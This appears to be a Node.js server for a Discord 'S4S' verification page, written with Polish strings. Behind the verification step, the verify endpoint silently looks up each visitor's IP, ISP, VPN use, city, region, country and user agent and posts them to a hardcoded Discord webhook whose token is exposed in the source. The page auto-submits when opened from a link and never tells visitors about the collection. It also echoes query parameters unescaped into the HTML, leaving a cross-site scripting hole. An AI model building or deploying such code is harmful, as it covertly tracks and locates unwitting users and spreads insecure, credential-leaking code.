const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Przechowywanie kodów
const validCodes = new Map();

// Funkcja do info o IP
async function getIPInfo(ip) {
  try {
    let cleanIp = ip;
    if (ip === '::1' || ip === '127.0.0.1' || ip === '::ffff:127.0.0.1') {
      cleanIp = '8.8.8.8';
    }
    
    if (cleanIp && cleanIp.includes('::ffff:')) {
      cleanIp = cleanIp.split('::ffff:')[1];
    }
    
    console.log(`🌐 Pobieranie danych dla IP: ${cleanIp}`);
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=66846719`);
    const data = response.data;
    
    if (data.status === 'success') {
      return {
        ip: data.query || cleanIp,
        isp: data.isp || 'Nieznany ISP',
        vpn: (data.proxy || data.hosting) ? 'Tak' : 'Nie',
        country: data.country || 'Nieznany',
        region: data.regionName || 'Nieznany',
        city: data.city || 'Nieznane',
        type: data.mobile ? 'Mobile' : (data.hosting ? 'Hosting' : 'Stacjonarny')
      };
    }
  } catch (error) {
    console.error('❌ Błąd pobierania info o IP:', error.message);
  }
  
  return {
    ip: ip || 'Nieznane',
    isp: 'Nieznany ISP',
    vpn: 'Nieznane',
    country: 'Nieznany',
    region: 'Nieznany',
    city: 'Nieznane',
    type: 'Nieznany'
  };
}

// Endpoint do rejestracji kodu
app.post('/api/register-code', (req, res) => {
  const { code, userId } = req.body;
  
  if (!code || !userId) {
    return res.status(400).json({ error: 'Brak danych' });
  }
  
  validCodes.set(code, {
    userId: userId,
    expires: Date.now() + 15 * 60 * 1000
  });
  
  for (let [key, value] of validCodes.entries()) {
    if (value.expires < Date.now()) {
      validCodes.delete(key);
    }
  }
  
  console.log(`✅ Kod ${code} zarejestrowany dla ${userId}`);
  res.json({ success: true });
});

// Strona weryfikacji
app.get('/', (req, res) => {
  const { code, userId } = req.query;
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Weryfikacja - S4S</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .container {
          background: white;
          border-radius: 20px;
          box-shadow: 0 20px 60px rgba(0,0,0,0.3);
          padding: 40px;
          max-width: 400px;
          width: 90%;
        }
        h1 {
          color: #333;
          margin-bottom: 20px;
          text-align: center;
          font-size: 28px;
        }
        .code-display {
          background: #f0f0f0;
          border-radius: 10px;
          padding: 20px;
          text-align: center;
          font-size: 32px;
          font-weight: bold;
          letter-spacing: 5px;
          margin-bottom: 20px;
          color: #667eea;
        }
        .form-group {
          margin-bottom: 20px;
        }
        label {
          display: block;
          margin-bottom: 5px;
          color: #666;
          font-weight: 500;
        }
        input {
          width: 100%;
          padding: 12px;
          border: 2px solid #e0e0e0;
          border-radius: 8px;
          font-size: 16px;
          transition: border-color 0.3s;
        }
        input:focus {
          outline: none;
          border-color: #667eea;
        }
        button {
          width: 100%;
          padding: 14px;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          border: none;
          border-radius: 8px;
          font-size: 18px;
          font-weight: 600;
          cursor: pointer;
          transition: transform 0.2s;
        }
        button:hover {
          transform: translateY(-2px);
        }
        .message {
          margin-top: 20px;
          padding: 10px;
          border-radius: 8px;
          text-align: center;
          display: none;
        }
        .message.success {
          background: #d4edda;
          color: #155724;
          display: block;
        }
        .message.error {
          background: #f8d7da;
          color: #721c24;
          display: block;
        }
        .info {
          margin-top: 20px;
          font-size: 14px;
          color: #999;
          text-align: center;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🔐 Weryfikacja - S4S</h1>
        <div class="code-display" id="codeDisplay">${code || 'Wpisz kod'}</div>
        
        <div class="form-group">
          <label for="code">Kod weryfikacyjny</label>
          <input type="text" id="code" placeholder="Wpisz kod" value="${code || ''}">
        </div>
        
        <input type="hidden" id="userId" value="${userId || ''}">
        
        <button onclick="verify()">Zweryfikuj</button>
        
        <div id="message" class="message"></div>
        <div class="info">S4S - System weryfikacji</div>
      </div>

      <script>
        async function verify() {
          const code = document.getElementById('code').value;
          const userId = document.getElementById('userId').value;
          const messageDiv = document.getElementById('message');
          
          if(!code) {
            messageDiv.className = 'message error';
            messageDiv.textContent = 'Wpisz kod weryfikacyjny!';
            return;
          }
          
          if(!userId) {
            messageDiv.className = 'message error';
            messageDiv.textContent = 'Brak ID użytkownika - wróć na Discorda i kliknij przycisk ponownie!';
            return;
          }
          
          messageDiv.className = 'message';
          messageDiv.textContent = '⏳ Weryfikacja...';
          messageDiv.style.display = 'block';
          
          try {
            const response = await fetch('/api/verify', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ code, userId })
            });
            
            const data = await response.json();
            
            if(data.success) {
              messageDiv.className = 'message success';
              messageDiv.textContent = '✅ Zweryfikowano pomyślnie! Możesz wrócić na Discorda.';
            } else {
              messageDiv.className = 'message error';
              messageDiv.textContent = '❌ ' + (data.message || 'Błąd weryfikacji');
            }
          } catch(error) {
            messageDiv.className = 'message error';
            messageDiv.textContent = '❌ Błąd połączenia z serwerem';
          }
        }
        
        window.onload = function() {
          const urlParams = new URLSearchParams(window.location.search);
          const code = urlParams.get('code');
          const userId = urlParams.get('userId');
          
          if(code) {
            document.getElementById('code').value = code;
          }
          if(userId) {
            document.getElementById('userId').value = userId;
          }
          
          if(code && userId) {
            setTimeout(verify, 500);
          }
        }
      </script>
    </body>
    </html>
  `);
});

// API endpoint do weryfikacji
app.post('/api/verify', async (req, res) => {
  const { code, userId } = req.body;
  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  if (clientIp && clientIp.includes(',')) {
    clientIp = clientIp.split(',')[0].trim();
  }
  
  console.log(`🔍 Weryfikacja: code=${code}, userId=${userId}, IP=${clientIp}`);
  
  if (!code || !userId) {
    return res.json({ success: false, message: 'Brak kodu lub userId' });
  }
  
  const stored = validCodes.get(code);
  if (!stored || stored.userId !== userId || stored.expires < Date.now()) {
    console.log(`❌ Nieprawidłowy kod: ${code}`);
    return res.json({ success: false, message: 'Nieprawidłowy lub wygasły kod!' });
  }
  
  validCodes.delete(code);
  
  const ipInfo = await getIPInfo(clientIp);
  console.log(`🌐 Dane IP: ${ipInfo.country}, ${ipInfo.isp}, IP: ${ipInfo.ip}`);
  
  // WEBHOOK
  const webhookUrl = 'https://discord.com/api/webhooks/1487149461628129331/Dr94e7Z8LgFU6pySfDtHcg9c5Uug7WY07B9fi9dqbsAEXRe20n6RSvXdaKCch3HGnGs2';
  
  try {
    const embedData = {
      embeds: [{
        title: '✅ Nowa weryfikacja',
        color: 0x00ff00,
        fields: [
          { name: '👤 Użytkownik', value: `<@${userId}> (${userId})`, inline: false },
          { name: '📡 NETWORK', value: `**IP:** ${ipInfo.ip}\n**ISP:** ${ipInfo.isp}\n**VPN:** ${ipInfo.vpn}`, inline: true },
          { name: '📍 LOCATION', value: `**Kraj:** ${ipInfo.country}\n**Region:** ${ipInfo.region}\n**Miasto:** ${ipInfo.city}`, inline: true },
          { name: '💻 DEVICE', value: `**Typ:** ${ipInfo.type}\n**UA:** ${req.headers['user-agent']?.substring(0, 50) || 'Nieznane'}`, inline: false }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: 'S4S - System weryfikacji' }
      }]
    };
    
    const response = await axios.post(webhookUrl, embedData);
    console.log(`✅ Webhook wysłany! Status: ${response.status}`);
  } catch (error) {
    console.error('❌ Błąd webhooka:', error.message);
    if (error.response) {
      console.error('Status:', error.response.status);
      console.error('Dane:', error.response.data);
    }
  }
  
  res.json({ success: true, message: 'Zweryfikowano pomyślnie!' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Serwer weryfikacji działa na porcie ${PORT}`);
});
